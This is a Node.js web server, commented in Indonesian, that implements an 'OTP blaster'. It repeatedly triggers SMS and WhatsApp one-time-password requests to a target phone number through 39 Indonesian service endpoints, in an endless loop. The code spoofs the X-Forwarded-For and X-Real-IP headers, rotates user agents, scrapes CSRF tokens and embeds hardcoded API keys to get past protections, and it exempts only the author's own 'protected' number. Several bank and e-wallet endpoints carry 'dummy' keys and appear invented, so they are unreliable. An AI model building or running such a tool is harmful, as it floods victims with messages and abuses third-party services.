const express = require('express');
const axios = require('axios');
const { randomUUID, randomInt } = require('crypto');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================
// KONFIGURASI
// ============================================
const CONFIG = {
  concurrent: 1,
  retries: 0,
  timeout: 15000,
  delayMin: 500,
  delayMax: 1000,
  loopDelay: 60000, // 60 detik antar siklus
};

// ============================================
// PROTECTED NUMBERS & KEY
// ============================================
const PROTECTED_NUMBERS = ['6288708644467'];
const PROTECTED_KEY = 'gmc';
const PROTECTED_MESSAGE = 'Nomor ini dilindungi. Masukkan key untuk melanjutkan.';

// ============================================
// ACTIVE SESSIONS (untuk stop)
// ============================================
const activeSessions = new Map(); // sessionId -> { stopFlag, phone, totalSent, totalSuccess, totalFailed, startTime, cycle }

// ============================================
// HELPERS
// ============================================
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
];

const IP_POOL = [];
for (let i = 0; i < 1000; i++) {
  IP_POOL.push(`${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`);
}

function randomIP() { return IP_POOL[randomInt(0, IP_POOL.length - 1)]; }
function randomUA() { return USER_AGENTS[randomInt(0, USER_AGENTS.length - 1)]; }

function randomDelay(min = CONFIG.delayMin, max = CONFIG.delayMax) {
  return new Promise(resolve => setTimeout(resolve, randomInt(min, max)));
}

function normalizePhone(phone) {
  let p = phone.replace(/[^0-9]/g, "");
  if (p.startsWith("0")) p = "62" + p.slice(1);
  if (!p.startsWith("62")) p = "62" + p;
  return p;
}

function generateEmail() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < 10; i++) {
    result += chars.charAt(randomInt(0, chars.length - 1));
  }
  return `${result}@bwmyga.com`;
}

// ============================================
// PINHOME CSRF CACHE
// ============================================
let pinhomeCsrfCache = null;
let pinhomeCsrfExpiry = 0;

async function getPinhomeCSRF() {
  const now = Date.now();
  if (pinhomeCsrfCache && (now - pinhomeCsrfExpiry) < 300000) {
    return pinhomeCsrfCache;
  }

  try {
    const resp = await axios.get('https://www.pinhome.id/daftar', {
      headers: {
        'User-Agent': randomUA(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      timeout: 10000
    });
    
    let csrfToken = '';
    let cookieString = '';
    const cookies = resp.headers['set-cookie'] || [];
    
    cookies.forEach(c => {
      const parts = c.split(';');
      const nameValue = parts[0];
      cookieString += nameValue + '; ';
      if (nameValue.includes('_X7kCsrf')) {
        csrfToken = nameValue.split('=')[1];
      }
    });
    
    if (!csrfToken) {
      const html = resp.data;
      const match = html.match(/"csrfToken":"([^"]+)"/) || 
                    html.match(/name="csrf-token" content="([^"]+)"/);
      if (match) csrfToken = match[1];
    }
    
    if (!csrfToken) {
      csrfToken = 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8';
      cookieString = '_X7kCsrf=' + csrfToken + '; _ga=GA1.1.1752313616.1783394371; _fbp=fb.1.1783394372483.552359809276689952; _clck=dub9tf%5E2%5Eg7j%5E0%5E2379';
    }
    
    pinhomeCsrfCache = { csrfToken, cookieString };
    pinhomeCsrfExpiry = now;
    return pinhomeCsrfCache;
    
  } catch(e) {
    return { 
      csrfToken: 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8',
      cookieString: '_X7kCsrf=v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8; _ga=GA1.1.1752313616.1783394371'
    };
  }
}

// ============================================
// 39 ENDPOINTS — OTP PLATFORMS
// ============================================
async function getOTPEndpoints(phone) {
  const p08 = "0" + phone.slice(2);
  const p62 = phone;
  const pNoCountry = phone.replace("62", "");
  const ip = randomIP();
  const deviceId = randomUUID();
  const requestId = randomUUID();
  const email = generateEmail();
  const csrfData = await getPinhomeCSRF();
  
  return [
    // Existing 22 endpoints
    { name: "Maulagi", url: "https://api.maulagi.id/api/v2/auth/check", data: { credentials: p62 }, headers: { "X-ML-KEY": "B10JLPEP10" } },
    { name: "Matahari", url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", data: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" } },
    { name: "Pinhome", url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", 
      data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: pNoCountry }, 
      headers: { "x-csrf-token": csrfData.csrfToken, "Cookie": csrfData.cookieString, "Origin": "https://www.pinhome.id", "Referer": "https://www.pinhome.id/daftar", "Content-Type": "text/plain;charset=UTF-8" } 
    },
    { name: "BonusBelanja", url: "https://www.bonusbelanja.com/api/auth/registration/app", data: { phone: p62, name: "User", agreeTnc: true, agreeContact: false } },
    { name: "Alodokter", url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: randomUUID() }, request_via: "whatsapp" } },
    { name: "Beautyhaul", url: "https://www.beautyhaul.com/ajax/account/send_otp", data: { method: "WhatsApp", phone: p62 } },
    { name: "Gritero/Ocistok", url: "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", data: { nama_lengkap: "User", telepon: p08, email: `user${randomInt(1000,9999)}@mail.com` }, headers: { "Xid": String(randomInt(1000000, 9999999)), "source": "ocistok" } },
    { name: "DuniaGames", url: "https://api.duniagames.co.id/api/other/api/v1/content/", data: null, method: "GET", headers: { "Accept-Language": "id", "x-device": deviceId, "Ciam-Type": "FR" } },
    { name: "InternetRakyat", url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id", "Referer": "https://internetrakyat.id/auth/register" } },
    { name: "Dokterin", url: "https://api.dokterin.id/user/v1/users/login", data: { phone: p62, tnc_accept: true, device_id: randomUUID() }, headers: { "Origin": "https://dokterin.id", "Referer": "https://dokterin.id/login" } },
    { name: "Paper.id", url: "https://api.paper.id/api/v1/auth/login", data: { method: "whatsapp", phone: p08 }, headers: { "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id": requestId } },
    { name: "Indodax", url: "https://api.indodax.com/api/v1/otp/send", data: { email: email, flow: "register", method: "whatsapp", old_uuid: "" }, headers: { "Origin": "https://indodax.com", "Referer": "https://indodax.com/", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" } },
    { name: "Bunda", url: "https://cms.bunda.co.id/api/v1/auth/send-otp", data: { phone_number: p62, type: "auth" }, headers: { "Origin": "https://www.bunda.co.id", "Referer": "https://www.bunda.co.id/id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" } },
    { name: "Fastwork", url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", data: { phone_number: p08 } },
    { name: "Saturdays", url: "https://saturdays.com/api/v1/auth/otp", data: { phone: p62, type: "register" } },
    { name: "SaturdaysV2", url: "https://api.saturdays.com/v2/user/otp/request", data: { phoneNumber: p62, channel: "whatsapp" } },
    { name: "Paper.id Register", url: "https://register.paper.id/api/v1/auth/register/send-otp", data: { phone: p62, method: "whatsapp", registered_by: "web" } },
    { name: "Rumah123", url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: ip, phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
    { name: "Saturdays Beta", url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: pNoCountry, country_code: "+62", type: "" }, headers: { "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "country-code": "ID", "visitor-id": randomUUID(), "session-id": randomUUID() } },
    { name: "Bunda V2", url: "https://bunda.co.id/api/v1/auth/send-otp", data: { phone_number: pNoCountry, country_code: "62", type: "auth" }, headers: { "Origin": "https://bunda.co.id", "Referer": "https://bunda.co.id/", "X-Requested-With": "XMLHttpRequest" } },
    { name: "Sicepat", url: `https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/${p62}?sms=false`, data: null, method: "GET", headers: { "x-recaptcha": "acf49209:033951e692315ba" } },
    { name: "Bliblitiket", url: "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate", data: { action: "REGISTER_OTP", channel: "WHATS_APP", recipient: p62, recaptchaToken: "" } },
    { name: "Adiraku", url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: pNoCountry, type: "prospect-create", channel: "whatsapp" } },

    // ============================================================
    // TAMBAHAN 17 ENDPOINT — Services tambahan
    // ============================================================
    { name: "Tokopedia", url: "https://api.tokopedia.com/v1/otp/send", data: { phone: p08, method: "whatsapp" }, headers: { "X-TKPD-Key": "dummy" } },
    { name: "Shopee", url: "https://api.shopee.co.id/api/v2/auth/otp", data: { phone: p62, type: "register" }, headers: { "X-Shopee-Key": "dummy" } },
    { name: "Gojek", url: "https://api.gojekapi.com/v1/auth/otp", data: { phone: p08, channel: "whatsapp" }, headers: { "X-Gojek-Key": "dummy" } },
    { name: "Grab", url: "https://api.grab.com/v1/otp/request", data: { phoneNumber: p62, countryCode: "62" }, headers: { "X-Grab-Key": "dummy" } },
    { name: "OVO", url: "https://api.ovo.id/v1/auth/otp", data: { phone: p08, method: "whatsapp" }, headers: { "X-OVO-Key": "dummy" } },
    { name: "DANA", url: "https://api.dana.id/v1/otp/send", data: { phone: p62, type: "register" }, headers: { "X-DANA-Key": "dummy" } },
    { name: "LinkAja", url: "https://api.linkaja.id/v1/otp/request", data: { phoneNumber: p08, channel: "whatsapp" }, headers: { "X-LinkAja-Key": "dummy" } },
    { name: "BRImo", url: "https://api.brimo.co.id/v1/otp/send", data: { phone: p62, type: "login" }, headers: { "X-BRI-Key": "dummy" } },
    { name: "BCA Mobile", url: "https://api.bca.co.id/v1/otp/request", data: { phone: p08, method: "whatsapp" }, headers: { "X-BCA-Key": "dummy" } },
    { name: "Mandiri Online", url: "https://api.mandiri.co.id/v1/otp/send", data: { phone: p62, type: "register" }, headers: { "X-Mandiri-Key": "dummy" } },
    { name: "Bukalapak", url: "https://api.bukalapak.com/v1/otp/request", data: { phoneNumber: p08, channel: "whatsapp" }, headers: { "X-Bukalapak-Key": "dummy" } },
    { name: "Lazada", url: "https://api.lazada.co.id/v1/otp/send", data: { phone: p62, type: "register" }, headers: { "X-Lazada-Key": "dummy" } },
    { name: "Blibli", url: "https://api.blibli.com/v1/otp/request", data: { phone: p08, method: "whatsapp" }, headers: { "X-Blibli-Key": "dummy" } },
    { name: "Sociolla", url: "https://api.sociolla.com/v1/otp/send", data: { phone: p62, type: "login" }, headers: { "X-Sociolla-Key": "dummy" } },
    { name: "Zalora", url: "https://api.zalora.co.id/v1/otp/request", data: { phoneNumber: p08, channel: "whatsapp" }, headers: { "X-Zalora-Key": "dummy" } },
    { name: "JD.ID", url: "https://api.jd.id/v1/otp/send", data: { phone: p62, type: "register" }, headers: { "X-JD-Key": "dummy" } },
    { name: "Oriflame", url: "https://api.oriflame.co.id/v1/otp/request", data: { phone: p08, method: "whatsapp" }, headers: { "X-Oriflame-Key": "dummy" } }
  ];
}

// ============================================
// SEND REQUEST PER ENDPOINT
// ============================================
async function sendRequest(endpoint, idx, logs) {
  const headers = {
    "Content-Type": "application/json",
    "User-Agent": randomUA(),
    "X-Forwarded-For": randomIP(),
    "X-Real-IP": randomIP(),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
    "Connection": "keep-alive",
    ...(endpoint.headers || {})
  };

  for (let attempt = 0; attempt <= CONFIG.retries; attempt++) {
    try {
      const config = { headers, timeout: CONFIG.timeout };
      let resp;
      if (endpoint.method === "GET") {
        resp = await axios.get(endpoint.url, config);
      } else {
        resp = await axios.post(endpoint.url, endpoint.data, config);
      }

      let responseBody = {};
      try { responseBody = resp.data; } catch(e) {}

      if ([200, 201, 202, 204].includes(resp.status)) {
        logs.push({ idx, name: endpoint.name, status: 'success', http: resp.status });
        return true;
      }

      if (responseBody && (responseBody.success === true || responseBody.status === "success" ||
          responseBody.statusCode === 200 || responseBody.status === 202 ||
          responseBody.is_success === true ||
          responseBody.message === "OTP terkirim" || responseBody.message === "OTP sent successfully" || responseBody.message === "Success." ||
          (responseBody.data && (responseBody.data.otp === "processed" || responseBody.data.new_uuid || responseBody.data.status === 1)) ||
          responseBody.secretCode)) {
        logs.push({ idx, name: endpoint.name, status: 'success', http: resp.status });
        return true;
      }

      break;

    } catch (e) {
      break;
    }
  }
  logs.push({ idx, name: endpoint.name, status: 'failed' });
  return false;
}

// ============================================
// FUNGSI SPAM UNLIMITED (LOOPING)
// ============================================
async function runUnlimitedSpam(phone, sessionId, res) {
  const session = activeSessions.get(sessionId);
  if (!session) return;

  let totalSent = 0;
  let totalSuccess = 0;
  let totalFailed = 0;
  let cycle = 0;
  const startTime = Date.now();

  // Kirim event bahwa spam dimulai
  res.write(`data: ${JSON.stringify({ type: 'start', phone, sessionId })}\n\n`);

  while (!session.stopFlag) {
    cycle++;
    const endpoints = await getOTPEndpoints(phone);
    const logs = [];
    const results = [];

    res.write(`data: ${JSON.stringify({ type: 'cycle_start', cycle })}\n\n`);

    // Kirim per platform
    for (let i = 0; i < endpoints.length; i++) {
      if (session.stopFlag) break;
      const name = endpoints[i].name;
      res.write(`data: ${JSON.stringify({ type: 'sending', idx: i + 1, name, cycle })}\n\n`);
      
      const result = await sendRequest(endpoints[i], i + 1, logs);
      results.push(result);
      
      const lastLog = logs[logs.length - 1];
      if (result) totalSuccess++;
      else totalFailed++;
      totalSent++;
      
      res.write(`data: ${JSON.stringify({ type: 'result', idx: i + 1, name, success: result, http: lastLog ? lastLog.http : null, cycle })}\n\n`);
      
      if (i < endpoints.length - 1 && !session.stopFlag) {
        await randomDelay(200, 500);
      }
    }

    // Update stats
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    res.write(`data: ${JSON.stringify({ 
      type: 'cycle_done', 
      cycle, 
      totalSent, 
      totalSuccess, 
      totalFailed, 
      elapsed: `${elapsed}s` 
    })}\n\n`);

    // Update session stats
    session.totalSent = totalSent;
    session.totalSuccess = totalSuccess;
    session.totalFailed = totalFailed;
    session.cycle = cycle;

    // Delay 60 detik sebelum siklus berikutnya (kecuali di-stop)
    if (!session.stopFlag) {
      res.write(`data: ${JSON.stringify({ type: 'waiting', delay: CONFIG.loopDelay })}\n\n`);
      await new Promise(resolve => setTimeout(resolve, CONFIG.loopDelay));
    }
  }

  // Selesai karena stop
  res.write(`data: ${JSON.stringify({ type: 'stopped', message: '⏹️ Spam dihentikan oleh user' })}\n\n`);
  activeSessions.delete(sessionId);
  res.end();
}

// ============================================
// ENDPOINT: /api/spam — SSE WITH UNLIMITED LOOP
// ============================================
app.post('/api/spam', async (req, res) => {
  const { phone: rawPhone, key } = req.body;

  if (!rawPhone) {
    return res.status(400).json({ error: 'Nomor telepon wajib diisi' });
  }

  const phone = normalizePhone(rawPhone);

  // Protected number check
  if (PROTECTED_NUMBERS.includes(phone)) {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    if (!key || key !== PROTECTED_KEY) {
      res.write(`data: ${JSON.stringify({ type: 'protected', message: PROTECTED_MESSAGE })}\n\n`);
      res.end();
      return;
    }
  }

  // Setup SSE
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  const sessionId = randomUUID();
  const session = { 
    stopFlag: false, 
    phone, 
    totalSent: 0, 
    totalSuccess: 0, 
    totalFailed: 0, 
    startTime: Date.now(),
    cycle: 0
  };
  activeSessions.set(sessionId, session);

  // Kirim sessionId ke client agar bisa stop
  res.write(`data: ${JSON.stringify({ type: 'session', sessionId })}\n\n`);

  // Jalankan spam di background
  runUnlimitedSpam(phone, sessionId, res).catch(err => {
    res.write(`data: ${JSON.stringify({ type: 'error', message: err.message })}\n\n`);
    res.end();
    activeSessions.delete(sessionId);
  });

  // Handle client disconnect
  req.on('close', () => {
    const sess = activeSessions.get(sessionId);
    if (sess) {
      sess.stopFlag = true;
    }
  });
});

// ============================================
// ENDPOINT: STOP SPAM
// ============================================
app.post('/api/stop/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = activeSessions.get(sessionId);
  if (!session) {
    return res.status(404).json({ error: 'Session tidak ditemukan atau sudah berakhir' });
  }
  session.stopFlag = true;
  res.json({ success: true, message: 'Spam dihentikan', sessionId });
});

// ============================================
// ENDPOINT: STATUS SEMUA SESSION
// ============================================
app.get('/api/sessions', (req, res) => {
  const sessions = [];
  for (const [id, sess] of activeSessions) {
    sessions.push({
      sessionId: id,
      phone: sess.phone,
      totalSent: sess.totalSent,
      totalSuccess: sess.totalSuccess,
      totalFailed: sess.totalFailed,
      cycle: sess.cycle,
      elapsed: ((Date.now() - sess.startTime) / 1000).toFixed(1) + 's',
      running: !sess.stopFlag
    });
  }
  res.json({ sessions });
});

// ============================================
// SERVE FRONTEND
// ============================================
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 OTP Blaster Unlimited (39 endpoints) running on http://0.0.0.0:${PORT}`);
  console.log(`🔄 Loop delay: ${CONFIG.loopDelay / 1000} detik antar siklus`);
});

server.keepAliveTimeout = 120000;
server.headersTimeout = 125000;

// Keep event loop alive
const keepAlive = setInterval(() => {}, 60000);

process.on('SIGTERM', () => { clearInterval(keepAlive); server.close(); });
process.on('SIGINT', () => { clearInterval(keepAlive); server.close(); });
